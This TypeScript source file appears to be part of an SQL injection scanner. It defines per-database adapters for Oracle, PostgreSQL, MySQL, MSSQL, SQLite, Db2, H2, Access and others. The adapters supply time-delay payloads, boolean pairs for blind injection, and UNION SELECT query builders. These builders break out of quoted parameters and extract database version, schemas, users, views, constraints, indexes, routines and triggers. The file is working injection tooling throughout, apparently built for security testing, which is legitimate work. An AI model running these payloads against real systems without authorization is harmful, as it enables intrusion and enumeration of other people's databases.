import { DbmsType, CandidateParameter } from '../../types/sqlScanner';
import { MetadataExtractor } from './MetadataExtractor';

export interface DatabaseAdapter {
  readonly dbmsType: DbmsType;
  readonly commentSyntax: string[];
  readonly stringConcat: (a: string, b: string) => string;
  readonly safeVersionQueries: string[];
  readonly timeDelayPayloads: (seconds: number) => string[];
  readonly booleanTrueFalsePairs: { trueCondition: string; falseCondition: string; description: string }[];
  readonly safeCatalogQueries: string[];
  readonly nullCast: (colIndex: number) => string;
  getVersionExtractionQuery: (param: CandidateParameter, renderColumn: number, columnCount: number) => string;
  getSchemasQuery?: (param: CandidateParameter, renderColumn: number, columnCount: number) => string;
  getViewsQuery?: (param: CandidateParameter, renderColumn: number, columnCount: number) => string;
  getConstraintsQuery?: (param: CandidateParameter, renderColumn: number, columnCount: number, tableName: string) => string;
  getIndexesQuery?: (param: CandidateParameter, renderColumn: number, columnCount: number, tableName: string) => string;
  getRoutinesQuery?: (param: CandidateParameter, renderColumn: number, columnCount: number) => string;
  getTriggersQuery?: (param: CandidateParameter, renderColumn: number, columnCount: number) => string;
}

export class OracleAdapter implements DatabaseAdapter {
  readonly dbmsType: DbmsType = 'Oracle';
  readonly commentSyntax = ['--', '/* */'];
  readonly stringConcat = (a: string, b: string) => `${a}||${b}`;
  readonly safeVersionQueries = [
    '(SELECT banner FROM v$version WHERE ROWNUM=1)',
    '(SELECT version FROM v$instance)',
  ];
  readonly timeDelayPayloads = (seconds: number) => [
    `dbms_pipe.receive_message(('RDS'),${seconds})`,
  ];
  readonly booleanTrueFalsePairs = [
    { trueCondition: '1=1', falseCondition: '1=2', description: 'Numeric equality' },
    { trueCondition: "'a'='a'", falseCondition: "'a'='b'", description: 'String equality' },
    { trueCondition: "(SELECT '1' FROM DUAL)='1'", falseCondition: "(SELECT '1' FROM DUAL)='2'", description: 'Oracle DUAL table test' },
  ];
  readonly safeCatalogQueries = [
    'SELECT table_name FROM user_tables WHERE ROWNUM<=20',
  ];
  readonly nullCast = () => 'NULL';

  public getVersionExtractionQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('(SELECT banner FROM v$version WHERE ROWNUM=1)', 'VER', 'Oracle');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM DUAL--`;
  }

  public getSchemasQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('username', 'SCH', 'Oracle');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM all_users WHERE ROWNUM<=25--`;
  }

  public getViewsQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('view_name', 'VIEW', 'Oracle');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM user_views WHERE ROWNUM<=25--`;
  }

  public getConstraintsQuery(param: CandidateParameter, renderColumn: number, columnCount: number, tableName: string): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters("constraint_name||'|'||constraint_type||'|'||r_constraint_name", 'CST', 'Oracle');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM all_constraints WHERE table_name=UPPER('${tableName}') AND ROWNUM<=10--`;
  }

  public getIndexesQuery(param: CandidateParameter, renderColumn: number, columnCount: number, tableName: string): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters("index_name||'|'||uniqueness", 'IDX', 'Oracle');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM all_indexes WHERE table_name=UPPER('${tableName}') AND ROWNUM<=10--`;
  }

  public getRoutinesQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters("object_name||'|'||object_type", 'RTN', 'Oracle');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM user_objects WHERE object_type IN ('PROCEDURE','FUNCTION') AND ROWNUM<=15--`;
  }

  public getTriggersQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters("trigger_name||'|'||table_name||'|'||triggering_event", 'TRG', 'Oracle');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM user_triggers WHERE ROWNUM<=15--`;
  }
}

export class PostgreSQLAdapter implements DatabaseAdapter {
  readonly dbmsType: DbmsType = 'PostgreSQL';
  readonly commentSyntax = ['--', '/* */'];
  readonly stringConcat = (a: string, b: string) => `${a}||${b}`;
  readonly safeVersionQueries = ['VERSION()'];
  readonly timeDelayPayloads = (seconds: number) => [
    `pg_sleep(${seconds})`,
    `(SELECT pg_sleep(${seconds}))`,
  ];
  readonly booleanTrueFalsePairs = [
    { trueCondition: '1=1', falseCondition: '1=2', description: 'Numeric equality' },
    { trueCondition: "'a'='a'", falseCondition: "'a'='b'", description: 'String equality' },
    { trueCondition: '5::text=5::text', falseCondition: '5::text=6::text', description: 'Postgres cast equality' },
  ];
  readonly safeCatalogQueries = [
    "SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 20",
  ];
  readonly nullCast = () => 'NULL';

  public getVersionExtractionQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('VERSION()', 'VER', 'PostgreSQL');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')}-- -`;
  }

  public getSchemasQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('schema_name', 'SCH', 'PostgreSQL');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM information_schema.schemata LIMIT 20-- -`;
  }

  public getViewsQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('table_name', 'VIEW', 'PostgreSQL');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM information_schema.views WHERE table_schema='public' LIMIT 20-- -`;
  }

  public getConstraintsQuery(param: CandidateParameter, renderColumn: number, columnCount: number, tableName: string): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters("constraint_name||'|'||constraint_type", 'CST', 'PostgreSQL');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM information_schema.table_constraints WHERE table_name='${tableName}' LIMIT 10-- -`;
  }

  public getIndexesQuery(param: CandidateParameter, renderColumn: number, columnCount: number, tableName: string): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('indexname', 'IDX', 'PostgreSQL');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM pg_indexes WHERE tablename='${tableName}' LIMIT 10-- -`;
  }

  public getRoutinesQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters("routine_name||'|'||routine_type", 'RTN', 'PostgreSQL');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM information_schema.routines WHERE routine_schema='public' LIMIT 15-- -`;
  }
}

export class MySQLAdapter implements DatabaseAdapter {
  readonly dbmsType: DbmsType = 'MySQL';
  readonly commentSyntax = ['#', '-- -', '/* */'];
  readonly stringConcat = (a: string, b: string) => `CONCAT(${a},${b})`;
  readonly safeVersionQueries = ['@@version', 'VERSION()'];
  readonly timeDelayPayloads = (seconds: number) => [
    `SLEEP(${seconds})`,
    `BENCHMARK(5000000,MD5(1))`,
  ];
  readonly booleanTrueFalsePairs = [
    { trueCondition: '1=1', falseCondition: '1=2', description: 'Numeric equality' },
    { trueCondition: "'a'='a'", falseCondition: "'a'='b'", description: 'String equality' },
  ];
  readonly safeCatalogQueries = [
    'SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 20',
  ];
  readonly nullCast = () => 'NULL';

  public getVersionExtractionQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('@@version', 'VER', 'MySQL');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')}-- -`;
  }

  public getSchemasQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('schema_name', 'SCH', 'MySQL');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM information_schema.schemata LIMIT 20-- -`;
  }

  public getViewsQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('table_name', 'VIEW', 'MySQL');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM information_schema.views WHERE table_schema=DATABASE() LIMIT 20-- -`;
  }

  public getConstraintsQuery(param: CandidateParameter, renderColumn: number, columnCount: number, tableName: string): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters("CONCAT(constraint_name,'|',constraint_type)", 'CST', 'MySQL');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM information_schema.table_constraints WHERE table_schema=DATABASE() AND table_name='${tableName}' LIMIT 10-- -`;
  }
}

export class MariaDBAdapter extends MySQLAdapter {
  readonly dbmsType: DbmsType = 'MariaDB';
}

export class MSSQLAdapter implements DatabaseAdapter {
  readonly dbmsType: DbmsType = 'Microsoft SQL Server';
  readonly commentSyntax = ['--', '/* */'];
  readonly stringConcat = (a: string, b: string) => `${a}+${b}`;
  readonly safeVersionQueries = ['@@VERSION'];
  readonly timeDelayPayloads = (seconds: number) => [
    `WAITFOR DELAY '0:0:${seconds}'`,
  ];
  readonly booleanTrueFalsePairs = [
    { trueCondition: '1=1', falseCondition: '1=2', description: 'Numeric equality' },
    { trueCondition: "'a'='a'", falseCondition: "'a'='b'", description: 'String equality' },
  ];
  readonly safeCatalogQueries = [
    'SELECT TOP 20 name FROM sys.tables',
  ];
  readonly nullCast = () => 'NULL';

  public getVersionExtractionQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('@@VERSION', 'VER', 'Microsoft SQL Server');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')}--`;
  }

  public getSchemasQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('name', 'SCH', 'Microsoft SQL Server');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM sys.schemas--`;
  }

  public getViewsQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('name', 'VIEW', 'Microsoft SQL Server');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM sys.views--`;
  }
}

export class SQLiteAdapter implements DatabaseAdapter {
  readonly dbmsType: DbmsType = 'SQLite';
  readonly commentSyntax = ['--', '/* */'];
  readonly stringConcat = (a: string, b: string) => `${a}||${b}`;
  readonly safeVersionQueries = ['sqlite_version()'];
  readonly timeDelayPayloads = (_seconds: number) => [
    `LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))`,
  ];
  readonly booleanTrueFalsePairs = [
    { trueCondition: '1=1', falseCondition: '1=2', description: 'Numeric equality' },
    { trueCondition: "'a'='a'", falseCondition: "'a'='b'", description: 'String equality' },
  ];
  readonly safeCatalogQueries = [
    "SELECT name FROM sqlite_master WHERE type='table' LIMIT 20",
  ];
  readonly nullCast = () => 'NULL';

  public getVersionExtractionQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('sqlite_version()', 'VER', 'SQLite');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')}-- -`;
  }

  public getViewsQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('name', 'VIEW', 'SQLite');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM sqlite_master WHERE type='view'-- -`;
  }
}

export class Db2Adapter implements DatabaseAdapter {
  readonly dbmsType: DbmsType = 'IBM Db2';
  readonly commentSyntax = ['--', '/* */'];
  readonly stringConcat = (a: string, b: string) => `${a}||${b}`;
  readonly safeVersionQueries = ['(SELECT service_level FROM sysibmadm.env_sys_info)'];
  readonly timeDelayPayloads = (seconds: number) => [
    `(SELECT COUNT(*) FROM syscat.columns c1, syscat.columns c2 WHERE c1.colname=c2.colname AND ${seconds}>0)`,
  ];
  readonly booleanTrueFalsePairs = [
    { trueCondition: '1=1', falseCondition: '1=2', description: 'Numeric equality' },
    { trueCondition: "'a'='a'", falseCondition: "'a'='b'", description: 'String equality' },
  ];
  readonly safeCatalogQueries = [
    'SELECT tabname FROM syscat.tables WHERE tabschema=CURRENT USER FETCH FIRST 20 ROWS ONLY',
  ];
  readonly nullCast = () => 'NULL';

  public getVersionExtractionQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('(SELECT service_level FROM sysibmadm.env_sys_info)', 'VER', 'IBM Db2');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')} FROM sysibm.sysdummy1--`;
  }
}

export class H2Adapter implements DatabaseAdapter {
  readonly dbmsType: DbmsType = 'H2';
  readonly commentSyntax = ['--', '/* */'];
  readonly stringConcat = (a: string, b: string) => `${a}||${b}`;
  readonly safeVersionQueries = ['H2VERSION()'];
  readonly timeDelayPayloads = (_s: number) => [];
  readonly booleanTrueFalsePairs = [
    { trueCondition: '1=1', falseCondition: '1=2', description: 'Numeric equality' },
    { trueCondition: "'a'='a'", falseCondition: "'a'='b'", description: 'String equality' },
  ];
  readonly safeCatalogQueries = ['SELECT table_name FROM information_schema.tables LIMIT 20'];
  readonly nullCast = () => 'NULL';

  public getVersionExtractionQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('H2VERSION()', 'VER', 'H2');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')}-- -`;
  }
}

export class AccessAdapter implements DatabaseAdapter {
  readonly dbmsType: DbmsType = 'Microsoft Access';
  readonly commentSyntax = ['--'];
  readonly stringConcat = (a: string, b: string) => `${a}&${b}`;
  readonly safeVersionQueries = [];
  readonly timeDelayPayloads = (_s: number) => [];
  readonly booleanTrueFalsePairs = [
    { trueCondition: '1=1', falseCondition: '1=2', description: 'Numeric equality' },
    { trueCondition: "'a'='a'", falseCondition: "'a'='b'", description: 'String equality' },
  ];
  readonly safeCatalogQueries = ['SELECT Name FROM MSysObjects WHERE Type=1'];
  readonly nullCast = () => 'NULL';

  public getVersionExtractionQuery(param: CandidateParameter, _renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const parts = Array(columnCount).fill('NULL');
    return `${unionPrefix}${parts.join(',')}--`;
  }
}

export class GenericAdapter implements DatabaseAdapter {
  readonly dbmsType: DbmsType = 'Generic SQL';
  readonly commentSyntax = ['--', '#', '/* */'];
  readonly stringConcat = (a: string, b: string) => `${a}+${b}`;
  readonly safeVersionQueries = ['@@version', 'version()'];
  readonly timeDelayPayloads = (s: number) => [`SLEEP(${s})`, `pg_sleep(${s})`, `WAITFOR DELAY '0:0:${s}'`];
  readonly booleanTrueFalsePairs = [
    { trueCondition: '1=1', falseCondition: '1=2', description: 'Numeric equality' },
    { trueCondition: "'a'='a'", falseCondition: "'a'='b'", description: 'String equality' },
  ];
  readonly safeCatalogQueries = [];
  readonly nullCast = () => 'NULL';

  public getVersionExtractionQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const wrapped = MetadataExtractor.wrapWithDelimiters('version()', 'VER', 'Generic SQL');
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }
    return `${unionPrefix}${parts.join(',')}-- -`;
  }
}

export const DATABASE_ADAPTERS: Record<DbmsType, DatabaseAdapter> = {
  Oracle: new OracleAdapter(),
  PostgreSQL: new PostgreSQLAdapter(),
  MySQL: new MySQLAdapter(),
  MariaDB: new MariaDBAdapter(),
  'Microsoft SQL Server': new MSSQLAdapter(),
  SQLite: new SQLiteAdapter(),
  'IBM Db2': new Db2Adapter(),
  H2: new H2Adapter(),
  'Microsoft Access': new AccessAdapter(),
  'Generic SQL': new GenericAdapter(),
  Unknown: new GenericAdapter(),
};
